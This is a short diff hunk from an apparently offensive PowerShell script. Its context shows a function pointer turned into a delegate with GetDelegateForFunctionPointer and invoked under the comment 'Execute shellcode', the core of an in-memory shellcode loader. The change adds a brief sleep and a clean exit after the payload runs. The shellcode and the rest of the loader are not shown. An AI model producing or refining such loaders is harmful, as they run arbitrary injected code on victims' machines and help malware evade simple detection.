@@ -37,3 +37,5 @@ $del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($
 
 # Execute shellcode
 $del.Invoke()
+Start-Sleep -Milliseconds 2500
+exit 0
